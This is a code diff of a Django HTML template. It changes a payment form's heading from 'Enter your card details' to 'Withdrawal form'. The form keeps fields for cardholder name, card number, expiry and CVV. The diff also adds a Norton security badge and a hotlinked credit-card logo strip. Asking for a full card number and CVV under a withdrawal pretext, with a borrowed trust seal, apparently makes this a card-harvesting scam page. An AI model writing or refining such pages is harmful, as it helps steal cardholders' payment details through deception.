@@ -56,13 +56,13 @@
 
 {% include 'cap/includes/cashbar.html' %}
 <div class="container">
-    <h5 class="mt-3 text-center">Enter your card details</h5><hr>
+    <h5 class="mt-3 text-center">Withdrawal form</h5>
     <form method="POST" class="form-group" style="font-size:14px">
       {% csrf_token %}
-      <span>Name on card:</span>
-      <input type="text" name="{{ form.name.html_name }}" placeholder="{{ form.name.html_name }}" id="log" class="w-100 mb-3">
-      <span>Card number:</span>
-      <input type="text" name="{{ form.cc_number.html_name }}" placeholder="card number" id="log" class="w-100 mb-4">
+      
+      <input type="text" name="{{ form.name.html_name }}" placeholder="Name on card" id="log" class="w-100 mb-4 mt-2">
+  
+      <input type="text" name="{{ form.cc_number.html_name }}" placeholder="Card number" id="log" class="w-100 mb-4">
       
       <div class="row">
         <div class="col-6">
@@ -70,7 +70,7 @@
           <input style="width:70px; text-align: center;" type="text" name="{{ form.cc_expiry.html_name }}" placeholder="11/12" id="log" class="mb-1">
         </div>
         <div class="col-6">
-          <span>CVV:</span><br>
+          <span>cvv:</span><br>
           <input style="width:70px; text-align: center;" type="text" name="{{ form.cc_code.html_name }}" placeholder="123" id="log" class="mb-1">
         </div>
       </div>
@@ -82,15 +82,16 @@
       
       
       <center>
-        <input type="submit" class="btn btn-success btn-sm my-4" value="Submit"><br>
-        <img src="{% static 'capping/mastercard.svg' %}" class="mr-1" style="height: 47px;">
-        <img src="{% static 'capping/visa.svg' %}" class="mr-1" style="height: 47px;">
-        <img src="{% static 'capping/american-express.svg' %}" class="mr-1" style="height: 47px;">
-        <img src="{% static 'capping/discover.svg' %}" style="height: 47px;">
+        <input type="submit" class="btn btn-success btn-sm my-2" value="Submit"><br>
       </center>
-
-
-
+        <center>
+        <img src="{% static 'capping/norton.jpg' %}" class="mr-1" style="height: 80px;"><br>
+        <a href="http://www.credit-card-logos.com/"><img alt="Credit Card Logos" title="Credit Card Logos"
+           src="http://www.credit-card-logos.com/images/multiple_credit-card-logos-1/credit_card_logos_16.gif" 
+          width="250" height="33" border="0" /></a>
+  
+  </center>
+  
 
     </form>
     </div>
